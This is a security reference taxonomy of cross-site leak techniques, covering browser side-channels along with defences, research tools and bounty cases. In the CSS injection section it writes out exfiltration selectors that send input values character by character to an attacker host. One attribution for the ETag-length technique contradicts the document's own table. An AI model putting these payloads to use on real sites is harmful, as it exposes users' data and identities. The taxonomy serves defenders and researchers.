# XS-Leaks (Cross-Site Leaks) Mutation/Variation Taxonomy

---

## Classification Structure

Cross-site leaks (XS-Leaks) are a class of vulnerabilities that exploit browser side-channels built into the web platform to infer information about users across origin boundaries. Unlike XSS or CSRF, XS-Leaks do not break the Same-Origin Policy directly; instead, they observe **observable variations** in browser behavior—timing differences, resource states, error signals, or rendering characteristics—to answer binary or quantitative questions about cross-origin resources.

The fundamental attack pattern is: *An attacker's origin loads, references, or interacts with a victim origin's resource and measures some observable side-effect that varies based on the resource's state, user authentication status, or content properties.*

### Three-Axis Classification Framework

**Axis 1 (Structural Target)**: The browser feature, API, or mechanism being observed—this is the primary organizational axis and structures the main taxonomy sections below.

**Axis 2 (Observable Discrepancy Type)**: The nature of the information leaked through observation:

| Discrepancy Type | Definition | Examples |
|------------------|------------|----------|
| **Timing Differential** | Measurable time variance in operation completion | Network timing, execution duration, cache hit/miss |
| **Binary State** | Boolean presence/absence signal | Error vs. success, loaded vs. blocked, exists vs. not-exists |
| **Quantitative Leak** | Numeric value extraction | Frame count, resource size, header length, redirect count |
| **Behavioral Difference** | State-dependent action or property change | Cached status, focus behavior, CORB enforcement |
| **Content Property** | Structural or rendering characteristic | Scrollbar presence, element dimensions, CSS match |

**Axis 3 (Attack Scenario)**: Covered in the Attack Scenario Mapping section (§9). Common scenarios include user de-anonymization, login detection, XS-Search (inferring search queries or results), browsing history inference, and cross-site state inference (COSI).

### Foundational Mechanism: Four Levels of Cross-Origin Interaction

XS-Leaks exploit the web's composability through four interaction levels:

1. **Resource Loading**: Loading scripts, images, iframes, stylesheets, fonts cross-origin and observing load success/failure or timing
2. **Window References**: Obtaining window object references via `window.open()`, `<iframe>`, or `window.opener` and accessing limited properties
3. **Navigation**: Initiating cross-origin navigations and observing side-effects (history length, timing, redirect behavior)
4. **Messaging & APIs**: Observing postMessage broadcasts, cache state, or browser API outputs that reveal cross-origin information

---

## §1. Timing-Based Leaks (Observable Duration Variance)

Timing attacks measure the duration of cross-origin operations to infer resource state or content. Timing differences arise from computational complexity, network latency, cache status, or resource size.

### §1-1. Network Timing

Measures time-to-load for cross-origin resources, revealing size, cache status, or backend processing time.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Performance API Timing** | Uses `performance.getEntries()` to extract timing metrics for cross-origin resources (redirects, DNS, connect, response times) | Requires resource inclusion; some metrics exposed cross-origin (e.g., redirect count via `PerformanceResourceTiming.redirectCount`) |
| **onload/onerror Timing** | Measures time between resource request and load/error event firing | Works on `<img>`, `<script>`, `<link>`, `<iframe>`; differential reveals size or processing complexity |
| **Fetch Timing** | Times `fetch()` or `XMLHttpRequest` to cross-origin endpoints | Requires CORS or opaque responses; duration leaks backend state (e.g., authenticated vs. unauthenticated response times) |

**Example**: If `https://bank.com/transfer?amount=1000` responds in 50ms when unauthorized but 200ms when authorized (due to transaction logging), the timing difference reveals authentication status.

### §1-2. Execution Timing (JavaScript Runtime Duration)

Exploits JavaScript's single-threaded event loop to measure cross-origin script execution time, revealing content or state through computational variance.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Event Loop Blocking** | Attacker measures delay in event queue by observing when messages/events are processed; cross-origin heavy computation blocks shared event loop | **Mitigated by Site Isolation** (Chromium) and Project Fission (Firefox) which separate origins into different threads |
| **Busy Event Loop via Same-Site Iframe** | Bypasses Site Isolation: opens target window with expensive JS, embeds same-site iframe, measures iframe load time as proxy for target's execution duration | Works because same-site frames share event loop despite process isolation |
| **Service Worker Timing** | Service worker intercepts navigation, starts timer, returns early response (204 No Content), measures time until main page completes | Bypasses process isolation; SW timing affected by target page's JS blocking |
| **jQuery/CSS Selector Timing** | Injects expensive CSS selectors (e.g., `:has(:has(:has(*)))`) that short-circuit on match failure; timing reveals DOM structure | Requires CSS injection or selector execution in target context |
| **ReDoS (Regular Expression DoS)** | Injects exponential-time regex into target page; execution time varies with input data, leaking content via runtime variance | Requires regex injection vulnerability; timing reveals input matching patterns |

**Defense Matrix**:

| Attack | SameSite Cookies | COOP | X-Frame-Options | Navigation Isolation Policy |
|--------|------------------|------|-----------------|---------------------------|
| Event Loop Blocking | ❌ | Limited | ❌ | ✅ |
| Service Worker Timing | ✅ | ✅ | ❌ | ✅ |
| Busy Event Loop | ❌ | Limited | ❌ | ✅ |

### §1-3. Cache Timing

Measures whether resource loaded from cache or network, revealing browsing history or resource access patterns.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Image.complete Property** | `<img>.complete` returns `true` if image is cached; attacker creates image, checks property immediately | **Largely mitigated** by partitioned caches (Chrome 86+, Safari); attack only works if cache key matches attacker's partition |
| **Performance.getEntries() Cache Detection** | Examines `transferSize` (0 for cached, >0 for network) or `duration` | Same mitigation as above; partitioned cache prevents cross-origin inference |
| **Force-Cache Fetch** | `fetch(url, {cache: 'force-cache'})` followed by timing; cached resources return instantly | Partitioned cache prevents cross-site cache probing |
| **Cache Probing via Redirect** | Checks if redirect target is cached by measuring redirect-following time | Modern browsers partition cache using (top-frame-site, resource-url) or (top-frame-site, framing-site, resource-url) tuples |

**Partitioned Cache Defense**: Since late 2020, Chrome, Edge, Safari partition HTTP cache by Network Isolation Key (top-level site + current-frame site), preventing cross-site cache probing. Firefox uses (top-frame-site, resource-url).

### §1-4. Connection Pool Timing

Exploits browser's per-origin connection pool limits to create timing oracles.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Connection Pool Saturation** | Attacker saturates target origin's connection pool (e.g., 6 connections in HTTP/1.1), then measures delay for additional request; delay reveals if target page made requests to same origin | Requires precise timing; HTTP/2 multiplexing reduces effectiveness |
| **XSS-Leak: Chrome Connection-Pool Prioritization** (2025) | Crafts request sequence exploiting Chrome's connection-pool prioritization algorithm as oracle to leak redirect hostnames cross-domain | Top 10 Web Hacking Techniques 2025; even if patched, methodology remains valuable for future connection-level oracles |

---

## §2. State-Based Leaks (Observable Object/Window Properties)

Attackers access limited cross-origin window or DOM properties to infer page state, user status, or content structure.

### §2-1. Frame Counting (window.length)

Counts the number of `<iframe>` elements in a cross-origin window to infer page state.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Static Frame Count** | `window.open(url)` or `<iframe>` reference; read `windowRef.length` to get frame count | Works if attacker obtains window reference; COOP prevents `window.open()` from returning reference |
| **Dynamic Frame Count Monitoring** | Polls `window.length` at intervals during page load to detect transient frames or loading patterns | Reveals page structure evolution; different frame counts for authenticated vs. unauthenticated states |

**Example**: If `https://social.com/profile` embeds 3 iframes when user is logged in but 1 iframe when logged out, `window.length` reveals authentication status.

**Defense**: `Cross-Origin-Opener-Policy: same-origin` prevents `window.open()` from returning window reference; `X-Frame-Options: DENY` prevents iframe embedding.

### §2-2. Window References (window.opener, frames[])

Exploits properties accessible on cross-origin window objects.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **window.opener Detection** | Checks if `window.opener` is null or accessible; reveals if page was opened via `window.open()` | Limited leak; mainly used for context detection |
| **frames[] Enumeration** | `window.frames[0]`, `window.frames[1]` accessible cross-origin; count reveals number of child frames | Similar to §2-1; combined with other leaks to infer state |
| **Closed Window Detection** | `windowRef.closed` returns `true` if window closed; reveals navigation or user action | Used in timing attacks to detect when popup/window closes after operation |

### §2-3. Navigation State (history.length)

Observes `history.length` to infer navigation count, revealing redirect chains or user interaction.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Redirect Count Inference** | Opens window, reads `history.length`; increment reveals number of redirects | Cross-origin `history.length` readable; increment = redirect count |
| **Download Detection via history.length** | Initiates download; if `history.length` unchanged, resource triggered download (Content-Disposition: attachment) vs. navigation | Binary oracle: download vs. navigation |

**Note**: `PerformanceResourceTiming.redirectCount` also exposes redirect count for included resources.

---

## §3. Error & Status Leaks (Success/Failure Signals)

Observing `onload` vs. `onerror` events, CORB/CORP enforcement, or HTTP status implications to infer resource existence, type, or user state.

### §3-1. Error Event Detection (onload/onerror)

Fundamental XS-Leak primitive: resources fire `onload` on success, `onerror` on failure.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Script Tag Status Oracle** | `<script src="https://target.com/api/resource">` fires `onload` if 200 OK (valid JS or not), `onerror` if 4xx/5xx or network error | Differentiates authenticated (200) vs. unauthenticated (401/403) resources |
| **Image Tag Status Oracle** | `<img src="...">` fires `onerror` for non-image responses or errors | Reveals resource type (image vs. other) or existence |
| **Link Prefetch Status** | `<link rel="prefetch">` fires events based on response status | Similar oracle to script/image |
| **Fetch/XHR CORS Error** | `fetch()` to cross-origin resource; CORS errors trigger rejection | Opaque response reveals nothing, but timing + success/failure can leak state |

**Classic Example**: `<script src="https://bank.com/my_receipt?q=groceries">` loads successfully (200) if user has groceries receipt, returns 404 otherwise; `onload` vs. `onerror` reveals receipt existence.

### §3-2. CORB (Cross-Origin Read Blocking) Leaks

CORB blocks certain cross-origin resource types to prevent Spectre attacks, but enforcement is observable.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CORB Enforcement Detection** | Resource with CORB-protected Content-Type (HTML, XML, JSON) + status 2xx triggers CORB; body/headers stripped; observable via resource size or specific API behavior | If CORB enforcement varies by user state, it leaks that state (e.g., API returns JSON for authenticated users, triggers CORB; returns image for unauthenticated, no CORB) |

**Example**: If `https://api.com/data` returns JSON (Content-Type: application/json) when user is logged in (triggering CORB when loaded via `<img>`), but returns image when logged out (no CORB), the CORB enforcement difference reveals login status.

### §3-3. CORP (Cross-Origin Resource Policy) Leaks

CORP is opt-in defense allowing sites to prevent cross-origin loading of resources; enforcement observable via error events.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **CORP Enforcement Detection** | Resource with `Cross-Origin-Resource-Policy: same-origin` triggers error when loaded cross-origin | If CORP applied conditionally (e.g., only when search results exist), error vs. success reveals state |

**Example**: Search endpoint applies CORP when returning results but not when returning "no results" page; `<img src="/search?q=secret">` fires `onerror` if results exist (CORP blocks), `onload` if no results.

---

## §4. Resource & Content Leaks (Size, Length, Structure)

Extracting quantitative information about cross-origin resources—size, header length, response structure—through observable proxies.

### §4-1. Response Size Inference

Inferring response size through various side-channels.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Site ETag Length Leak** (2025) | Exploits 431 "Request Header Fields Too Large" errors + History API: attacker crafts requests with varying total header sizes (including ETag in subsequent requests); 431 error threshold reveals ETag length, which varies by page content | Top 10 Web Hacking Techniques 2025; discovered as SECCON CTF 14 challenge; works even without HTML injection |
| **Resource Timing transferSize** | `PerformanceResourceTiming.transferSize` exposed for some cross-origin resources (post-CORS); reveals approximate response size | Limited to resources with Timing-Allow-Origin header |
| **Scrollbar-Based Size Leak** | Embeds target in iframe, injects CSS to detect scrollbar presence via `::-webkit-scrollbar` pseudo-element or layout measurements; scrollbar indicates content exceeds viewport | Requires CSS injection or iframe control |

**Breakthrough (2025)**: Takeshi Kaneko's ETag-length technique leaks response-size cross-domain via elegant chain of edge-cases, offering advantages over traditional origin-leak techniques due to versatility and difficulty of patching.

### §4-2. Header & Metadata Leaks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ETag Presence/Absence** | Observes whether `ETag` header present via 431-error oracle (§4-1) or other side-channels | `res.end()` may omit ETag; full response includes ETag; presence reveals code path taken |
| **Content-Disposition Download** | Detects `Content-Disposition: attachment` via `history.length` (§2-3) or download prompt | Reveals resource intended as download vs. inline display |
| **X-Frame-Options Detection** | Attempts iframe embedding; if blocked, X-Frame-Options present | Binary oracle for framing protection; rarely state-dependent |

---

## §5. Behavioral & Interaction Leaks (User/Browser Action Observables)

Leaks based on browser behavior changes, focus events, or user interactions.

### §5-1. ID Attribute Leaks (Focus/Blur Events)

Exploits hash fragment navigation to detect element IDs via focus events.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Focus Event ID Brute-Force** | Loads `https://target.com#element-id` in iframe/window; if `id="element-id"` exists and is focusable, `focus` event fires; attacker listens to `window.onfocus` or observes focus-related behavior | Single request + hash modification doesn't re-fetch page; cycles through IDs client-side; valid ID triggers focus |
| **Blur Event ID Detection** | Similar to above but monitors `blur` events or focus stealing | Reveals existence of specific element IDs |

**PortSwigger Research**: "XS-Leak: Leaking IDs using focus" demonstrated this technique; usable for user enumeration (e.g., `#user-12345`).

### §5-2. Element Leaks

Detecting specific element presence or properties cross-origin.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **HTML Object Tag Rendering Detection** | `<object data="..." typemustmatch>` with specific `type` attribute; if resource matches type, renders; otherwise fails; combined with simulated `onload` event to detect rendering | Reveals content type cross-origin |
| **Portal Tag Detection** | Chrome experimental `<portal>` tag doesn't respect X-Frame-Options; embeds target page; observable properties leak state | Experimental; PortSwigger research: "XS-Leak: Detecting IDs using Portal" |

### §5-3. User Interaction Observables

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Download Prompt Detection** | User download prompt changes focus, triggers events, or alters history; measurable via timing or window focus | Reveals `Content-Disposition: attachment` |
| **beforeunload Event Observation** | Cross-origin navigation may trigger observable `beforeunload` timing variance | Limited applicability; requires precise timing |

---

## §6. Navigation & History Leaks

Exploiting browser navigation behavior, redirects, or URL handling to infer cross-origin state.

### §6-1. Redirect Leaks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Redirect Count (history.length)** | After opening window, read `history.length`; each redirect increments count | Cross-origin `history.length` readable |
| **Redirect Count (PerformanceResourceTiming)** | `PerformanceResourceTiming.redirectCount` exposes number of redirects for included resources | Requires resource inclusion (script, img, etc.) |
| **XSS-Leak: Connection-Pool Redirect Hostname** (2025) | Uses Chrome's connection-pool prioritization to leak redirect target hostname cross-domain | Top 10 2025; even post-patch, technique inspires future redirect-oracle research |

### §6-2. Navigation Timing

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Navigation Duration** | Measures time from `window.open(url)` to `onload`; duration varies by response size, redirects, server processing | Similar to §1-1 but for full navigations |
| **CSP Violation Redirect** | If CSP blocks navigation, observable error or lack of redirect | Reveals CSP enforcement cross-origin |

---

## §7. CSS & Rendering Leaks

Exploiting CSS properties, selectors, or rendering behavior to leak content or state.

### §7-1. CSS Injection-Based Leaks

Requires CSS injection on target page; uses selectors as content oracles.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Attribute Selector Brute-Force** | Injects `input[value^="a"] { background: url(https://attacker.com/a) }`; if attribute starts with "a", CSS loads background image, making request to attacker; brute-force full value char-by-char | Requires CSS injection; works on input values, data attributes, href, etc. |
| **@font-face Conditional Loading** | `@font-face { src: url(https://attacker.com/a) }` + `input[value^="a"] { font-family: a }`; font loads only if selector matches | More stealthy than background; same principle |
| **Ligature-Based Exfiltration** | Uses font ligatures to represent character sequences; rendering specific ligatures triggers observable font load patterns | Advanced; limited applicability |
| **Scrollbar Appearance** | Injects CSS causing scrollbars if content exceeds size; scrollbar styled with `background: url()` makes request on appearance | Leaks content size threshold crossing |
| **Conditional Crash via CSS** | `<iframe>` with CSS selector triggering crash if match; Full Site Isolation propagates crash to all frames of that site; attacker detects crash via dummy iframe onload absence | Advanced; requires crash-triggering CSS + Site Isolation |

**Bypassing Strict CSP**: When CSP blocks external requests (`img-src 'none'`), exfiltration possible via:
- CSS-based data exfiltration through DOM clobbering
- Forcing quirks mode + CSS tricks (ASIS CTF quals 2025, "XS-Spin Blog")

### §7-2. CSS Tricks (Non-Injection)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Visited Link Styling** | `:visited` pseudo-class historically leaked browsing history via `getComputedStyle()`; now heavily restricted | **Largely mitigated**; remaining vectors: timing via layout recalculation |
| **Rendering Timing** | CSS selector complexity (e.g., `:has(:has(:has(*)))`) causes measurable rendering delays; timing reveals DOM structure | Requires ability to trigger reflow/repaint |

---

## §8. Communication Channel Leaks

Exploiting cross-origin messaging or storage APIs to infer state.

### §8-1. postMessage Broadcasts

Applications broadcast `postMessage` to all origins; message presence, origin, or content reveals state.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unfiltered postMessage Receipt** | Attacker opens target in `<iframe>` or `window.open()`, listens for `message` events; receives broadcasts if `targetOrigin` set to `*` | Application must broadcast without origin restriction |
| **Message Count Oracle** | Counts number of messages received; count varies by user state (e.g., logged-in users receive 5 messages, logged-out receive 2) | Reveals state through quantitative difference |
| **Message Content Oracle** | Message content varies by state; even if encrypted, length or structure may leak information | Requires state-dependent messaging |
| **Message Origin Oracle** | Origin of postMessage sender reveals which sub-origins are active | Leaks active subdomains or services |

**Intigriti CTF (December)**: Demonstrated chaining XS-Leaks + postMessage XSS + CSP bypass + DOM clobbering to achieve full XSS with one victim click.

**Defense**: Always specify explicit `targetOrigin` in `postMessage(msg, targetOrigin)`, never wildcard `*`.

### §8-2. Broadcast Channel API

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **BroadcastChannel Message Leaks** | Similar to postMessage but via BroadcastChannel API; same-origin only, but sub-origin leaks possible | Limited cross-origin applicability; mainly same-origin state inference |

---

## §9. Attack Scenario Mapping (Axis 3)

This section maps the structural leak categories (§1–§8) to real-world attack scenarios, showing how individual techniques combine to weaponize information leakage.

| Scenario | Objective | Architecture/Conditions | Primary Mutation Categories | Example Combination |
|----------|-----------|-------------------------|----------------------------|---------------------|
| **User De-anonymization** | Determine precise user ID or identity on target site | Target site uses predictable user IDs in URLs, element IDs, or redirects | §2-3 (Navigation State), §5-1 (ID Attribute), §8-1 (postMessage) | Focus-based ID brute-force (§5-1) + postMessage user broadcasts (§8-1) |
| **Login/Session Detection** | Infer if user is authenticated to target site | Different responses (status, size, frame count) for auth vs. unauth | §1-1 (Network Timing), §2-1 (Frame Count), §3-1 (Error Events) | Script tag oracle (§3-1): 200 if logged in, 401 if not |
| **XS-Search (Search Query Inference)** | Leak user's search terms or results existence on target site | Search results page structure varies with results presence/content | §1-2 (Execution Timing), §2-1 (Frame Count), §3-3 (CORP), §7-1 (CSS Injection) | CSS attribute selector (§7-1) brute-forces search input value char-by-char |
| **Browsing History Inference** | Determine which sites/pages user has visited | Browser cache retains visited resources | §1-3 (Cache Timing), §7-2 (Visited Links) | **Mitigated by partitioned cache (§1-3)**; historical `:visited` timing |
| **Cross-Origin State Inference (COSI)** | Leak arbitrary user state (cart items, notifications, settings) across origins | Application exposes state-dependent observables (frame count, message broadcasts, error status) | All categories; most comprehensive scenario | Frame count (§2-1) reveals cart items count; ETag length (§4-1) leaks notification count; postMessage (§8-1) broadcasts user settings |
| **Sensitive Data Exfiltration** | Extract specific data (email, name, transaction details) from cross-origin page | Requires CSS injection or brute-forceable observables | §7-1 (CSS Injection), §5-1 (ID Attribute), §4-1 (Response Size) | CSS selector brute-force (§7-1) extracts input field values; ID focus (§5-1) confirms transaction IDs |
| **Internal Network Mapping (SSRF-like)** | Determine existence of internal resources or services via user's browser | User accesses internal network; attacker uses XS-Leaks to probe via victim's browser | §1-1 (Network Timing), §3-1 (Error Events) | Script tag oracle (§3-1) tests `http://internal-service:8080/api` via user's browser; `onload` vs. `onerror` reveals service existence |
| **Account/Email Enumeration** | Determine if specific email/username exists on target site | Registration/password reset pages vary response by user existence | §1-1 (Network Timing), §3-1 (Error Events), §4-1 (Response Size) | Timing differential (§1-1) in password reset: 50ms for non-existent user, 200ms for existing user (email sending) |

### Multi-Stage Attack Chains

**Facebook User Identification (2024-2025)**: Combined multiple XS-Leaks to:
1. Detect logged-in Facebook/Workplace/Meta Work users (§3-1 error events)
2. De-anonymize precise user ID on third-party sites (§5-1 ID attribute leaks)
3. Detect Meta employees (§8-1 postMessage broadcasts from internal tools)
4. Cross-platform fingerprinting without user interaction (§1-3 cache probing + §2-1 frame counting)

**Massive XS-Search on Google Products (terjanq, Medium)**: Demonstrated systematic XS-Search across Gmail, Drive, Calendar using frame counting + timing + error events to infer search terms and email contents.

---

## §10. CVE / Bounty Mapping (2021–2025)

| Mutation Combination | CVE / Case | Impact / Bounty | Year |
|---------------------|-----------|-----------------|------|
| §5-1 (ID Attribute Focus) + §8-1 (postMessage) | **Facebook User De-anonymization** (Youssef Sammouda, 4 bugs) | Cross-site user ID leak, Meta employee detection, cross-platform fingerprinting | 2024-2025 |
| §7-1 (CSS Attribute Selector) | **Imgur De-anonymization Attack** (HackerOne #723175) | IMDEA Software Institute disclosed flaw affecting Imgur users via CSS-based XS-Leak | ~2019 |
| §4-1 (ETag Length) + §2-3 (history.length) | **Cross-Site ETag Length Leak** (SECCON CTF 14, Arkark blog) | Novel oracle via 431 errors; Top 10 Web Hacking Techniques 2025 | 2025 |
| §1-4 (Connection Pool Prioritization) | **XSS-Leak: Leaking Cross-Origin Redirects** (Takeshi Kaneko) | Chrome connection-pool oracle leaks redirect hostnames; Top 10 2025 | 2025 |
| §1-3 (Cache Timing) + §3-1 (Error Events) | **Massive XS-Search on Google Products** (terjanq) | Inferred Gmail search terms, Drive files, Calendar events via combined timing + frame counting | ~2020 |
| §8-1 (postMessage) + §5-1 (ID) + §7-1 (CSS) | **Intigriti December CTF** (XS-Leaks + postMessage XSS chain) | Chained XS-Leaks, DOM clobbering, CSP bypass, postMessage to achieve XSS with one click | 2024 |
| §1-2 (Execution Timing) + §2-1 (Frame Count) | **AutoLeak Discovery** (CCS 2023) | 8,403 leak techniques identified; 5 novel XS-Leak classes; 20/24 Tranco Top 50 sites affected | 2023 |
| §3-2 (CORB) + §3-3 (CORP) | **XSinator 14 New Attack Classes** (CCS 2021) | Evaluated 56 browser/OS combinations, found 14 novel attack classes including CORB/CORP side-channels | 2021 |
| §7-1 (CSS Injection) | **CTFd 0day: XS-Leaking flags with CSS** (Jorian Woltjer) | Extracted CTF flags via CSS selector brute-force without HTML injection | 2024 |
| Multiple | **Meta Bug Bounty Program** (payout guidelines) | Meta rewards XS-Leaks based on data type (PII, friend lists, private content) + attack vector; browser bugs excluded | Ongoing |

**Note**: Many XS-Leaks are not assigned CVEs because they exploit intended browser features, not implementation bugs. Impact is assessed via bug bounties (Meta $2.3M paid in 2024) and security researcher disclosures.

---

## §11. Detection & Defense Tools

### Offensive/Research Tools

| Tool | Type | Target Scope | Core Technique |
|------|------|-------------|---------------|
| **XSinator** (xsinator.com) | Browser Test Suite | Automated XS-Leak vulnerability scanning for 56 browser/OS combinations | Tests 34+ XS-Leak vectors with one click; accompanying CCS 2021 paper |
| **AutoLeak** | Differential Fuzzer | Automated XS-Leak detection in Chrome, Firefox, Safari | Generates 151,776 test cases; detected 8,403 leak techniques per case; found 5 novel classes (CCS 2023) |
| **The Leaky Web** | Automated Scanner | Detects observation channels in Chromium, Firefox, Safari engines | Identified 280 observation channels cross-site (IEEE S&P 2023) |
| **Scripted Henchmen** | Vulnerability Scanner | Leverages XS-Leaks to detect XSS/SQLi cross-site | Uses XS-Leaks as detection primitives; analyzed attacker-initiated requests (WOOT 2023) |
| **HTTP Garden** | Differential Testing | HTTP parser differentials (related to request smuggling, not direct XS-Leaks) | Identifies parser inconsistencies that may enable leak vectors |

### Defensive Tools

| Tool | Type | Protection Scope | Core Technique |
|------|------|-----------------|---------------|
| **Leakuidator** | Browser Extension | Chromium-based browsers (Chrome, Edge, Brave) | Detects potentially suspicious cross-origin requests; allows user-configurable blocking; minimal overhead |
| **Fetch Metadata Validation** | Server-Side Policy | Resource Isolation Policy enforcement | Validates `Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest` headers; rejects unexpected cross-origin requests |
| **Partitioned Cache** | Browser Default | Cache-based XS-Leaks (§1-3) | Chrome 86+, Safari: cache keyed by (top-frame-site, resource-url) or (top-frame-site, framing-site, resource-url); prevents cross-origin cache probing |
| **Site Isolation** | Browser Architecture | Execution timing attacks (§1-2 Event Loop Blocking) | Chromium/Chrome: separate processes per site; Firefox Project Fission; prevents cross-origin event loop observation |

### Defense Mechanism Summary

| Defense Header/API | Protected Leaks | Deployment Notes |
|-------------------|-----------------|------------------|
| **Cross-Origin-Opener-Policy: same-origin** (COOP) | §2-1 (Frame Counting), §2-2 (Window References), §8-1 (postMessage) | Prevents `window.open()` from returning reference; breaks legitimate popups if not carefully deployed |
| **Cross-Origin-Resource-Policy: same-origin** (CORP) | §3-1 (Error Events), §4-1 (Resource Size) | Blocks cross-origin resource loading; may break CDNs or third-party integrations |
| **X-Frame-Options: DENY / SAMEORIGIN** | §2-1 (Frame Counting), §5-1 (ID Attribute), §7-1 (CSS Injection in iframe) | Legacy framing protection; CSP `frame-ancestors` preferred |
| **SameSite=Strict / Lax Cookies** | All categories (limits authenticated state leakage) | Prevents cookies on cross-site requests; Lax allows top-level navigation, Strict blocks all |
| **Fetch Metadata Headers** (Sec-Fetch-*) | All categories (server-side filtering) | Server validates request context; rejects unexpected cross-origin requests |
| **Cross-Origin-Embedder-Policy: require-corp** (COEP) | Spectre-related, some §3-2 (CORB) | Requires all resources have CORP or CORS; enables `SharedArrayBuffer` |
| **Timing-Allow-Origin** | §1-1 (Performance API Timing) | Limits exposed timing metrics cross-origin; default blocks detailed timings |
| **Navigation Isolation Policy** (experimental) | §1-2 (Execution Timing) | Experimental; strongest defense against execution timing attacks |
| **Partitioned Cache** | §1-3 (Cache Probing) | Default in modern browsers (Chrome 86+, Safari); no opt-in needed |

---

## §12. Summary: Core Principles

### Why XS-Leaks Exist: The Composability Dilemma

The web's fundamental design enables cross-origin resource embedding and interaction—loading scripts, images, iframes, navigating to external sites—to enable the rich, interconnected web. The Same-Origin Policy prevents *direct* data access across origins, but it cannot eliminate **observable side-effects** of these interactions without breaking core web functionality.

Every feature that allows cross-origin observation—timing APIs, error events, window properties, CSS rendering, cache behavior—exists for legitimate purposes (performance monitoring, error handling, user experience), yet each introduces a side-channel. The attack surface is **inherent to the web platform**, not a bug in individual implementations.

### Why Incremental Patches Fail

XS-Leaks are not vulnerabilities in code but **vulnerabilities in design**. Patching individual leak vectors (e.g., restricting `:visited` styling, partitioning cache, blocking CORB observability) addresses symptoms, not the root cause. Attackers adapt by discovering novel observation channels:

- **2015**: Timing attacks (Tom Van Goethem)
- **2019**: Leaky Images (USENIX)
- **2021**: 14 new attack classes via XSinator (CORB/CORP leaks, frame counting)
- **2023**: 280 observation channels via The Leaky Web; 8,403 techniques via AutoLeak
- **2025**: ETag-length oracle via 431 errors; connection-pool redirect hostname leaks

Each browser mitigation (partitioned cache, Site Isolation, COOP) closes a subset of vectors, but the **combinatorial space of observables** ensures new techniques emerge. AutoLeak's systematic evaluation shows that even after years of mitigations, modern browsers expose thousands of exploitable leak techniques.

### Structural Solutions: Defense-in-Depth

No single mitigation eliminates XS-Leaks. Effective defense requires **layered, opt-in policies** combined with **secure browser defaults**:

#### Application-Layer Defenses (Immediate Deployment):
1. **Fetch Metadata Validation**: Reject unexpected cross-origin requests using `Sec-Fetch-Site` headers
2. **SameSite Cookies**: Prevent authenticated state leakage on cross-site requests
3. **COOP + CORP Headers**: Isolate sensitive resources from cross-origin observation
4. **Unpredictable Tokens**: Replace predictable IDs/structures with random tokens to prevent brute-force
5. **Consistent Response Structures**: Return uniform responses (same status, size, timing) regardless of state

#### Browser-Level Defenses (Platform Evolution):
1. **Partitioned Cache** (default): Eliminates cache-based history inference
2. **Site Isolation / Project Fission**: Prevents cross-origin event loop timing
3. **Restricted Timing Precision**: Reduce timer resolution to prevent micro-timing attacks
4. **COOP Enforcement**: Default to isolating browsing contexts across origins
5. **Navigation Isolation Policy**: Experimental strong isolation for execution timing

#### Long-Term Platform Evolution:
The ultimate solution requires **rethinking cross-origin interaction defaults**. Proposals include:
- **Opt-in Cross-Origin Observability**: Reverse the default—make cross-origin observation explicit rather than implicit
- **Standardized Noise Injection**: Add randomness to timing, counts, sizes to obscure state-dependent signals
- **Privacy Budget**: Limit total information leakage per origin per session (Privacy Pass, Trust Tokens concepts)

### The Attacker's Persistent Advantage

XS-Leaks exploit **composition of innocuous features** (e.g., 431 errors + History API + ETag headers = §4-1 ETag-length leak). Defenders must secure every potential observable; attackers need only find one exploitable combination. As AutoLeak and The Leaky Web demonstrate, exhaustive enumeration reveals thousands of vectors even in hardened browsers.

The research community's shift from finding individual leaks to **systematic discovery methodologies** (differential fuzzing, formal models, automated test generation) reveals the true scale: XS-Leaks are not a finite set of vulnerabilities to patch, but a **fundamental property of the web platform's composability**. Effective defense requires architectural change, not just incremental fixes.

---

## References

### Academic Research
- [XSinator.com: From a Formal Model to the Automatic Evaluation of Cross-Site Leaks in Web Browsers](https://dl.acm.org/doi/10.1145/3460120.3484739) (CCS 2021)
- [Finding All Cross-Site Needles in the DOM Stack: AutoLeak](https://dl.acm.org/doi/10.1145/3576915.3616598) (CCS 2023)
- [The Leaky Web: Automated Discovery of Cross-Site Information Leaks](https://ieeexplore.ieee.org/document/10179311/) (IEEE S&P 2023)
- [SoK: Exploring Current and Future Research Directions on XS-Leaks](https://www.nortonlifelock.com/content/dam/nortonlifelock/pdfs/research-papers/2022-research-papers/sanchez-rola_asiaCCS22.pdf) (AsiaCCS 2022)
- [The Clock is Still Ticking: Timing Attacks in the Modern Web](https://dl.acm.org/doi/10.1145/2810103.2813632) (CCS 2015)
- [Leaky Images: Targeted Privacy Attacks in the Web](https://dl.acm.org/doi/10.5555/3361338.3361403) (USENIX Security 2019)

### Practitioner Resources
- [XS-Leaks Wiki](https://xsleaks.dev/) – Comprehensive community-maintained documentation
- [OWASP XS Leaks Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html)
- [MDN Cross-site leaks (XS-Leaks)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XS-Leaks)
- [PortSwigger Daily Swig: XS-Leak Coverage](https://portswigger.net/daily-swig/xs-leak)

### Recent Discoveries (2024-2025)
